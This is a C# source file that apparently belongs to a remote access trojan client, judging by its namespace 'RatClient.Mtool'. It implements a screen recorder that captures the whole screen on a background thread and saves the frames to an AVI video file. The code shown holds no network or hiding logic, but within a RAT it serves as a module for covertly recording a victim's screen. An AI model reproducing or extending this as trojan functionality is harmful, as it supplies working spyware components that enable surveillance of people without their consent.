using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using SharpAvi.Codecs;
using SharpAvi.Output;


namespace RatClient.Mtool
{
    class ScreenRecorder
    {
        private readonly int Width = Info.Resoulution.Width;
        private readonly int Height = Info.Resoulution.Height;
        private Thread t;
        private ManualResetEvent stopRecordingEvent;
        private Bitmap BMP;
        private Graphics g;
        private Size size;

        public ScreenRecorder()
        {
            BMP = new Bitmap(Width, Height);
            g = Graphics.FromImage(BMP);
            size = new Size(Width, Height);
        }

        public void Shot(byte[] Buffer)
        {
            g.CopyFromScreen(Point.Empty, Point.Empty, size, CopyPixelOperation.SourceCopy);
            g.Flush();
            var bits = BMP.LockBits(new Rectangle(0, 0, Width, Height), ImageLockMode.ReadOnly, PixelFormat.Format32bppRgb);
            Marshal.Copy(bits.Scan0, Buffer, 0, Buffer.Length);
            BMP.UnlockBits(bits);
        }

        private void RecordVideo(string path)
        {
            byte[] buffer = new byte[Width * Height * 4];

            using (var aviWriter = new AviWriter(path) { FramesPerSecond = 10 })
            {
                var stream = aviWriter.AddMJpegWpfVideoStream(Width, Height);
                int wait = 1000 / (int)aviWriter.FramesPerSecond;

                while (!stopRecordingEvent.WaitOne(wait))
                {
                    Shot(buffer);
                    stream.WriteFrame(true, buffer, 0, buffer.Length);
                }
            }
        }

        public void StartRecording(string path)
        {
            System.Console.WriteLine($"{Width}x{Height}");
            stopRecordingEvent = new ManualResetEvent(false);
            t = new Thread(() => RecordVideo(path));
            t.Start();
        }

        public void StopRecording()
        {
            stopRecordingEvent.Set();
            t.Join();
            g.Dispose();
            BMP.Dispose();
        }
    }
}
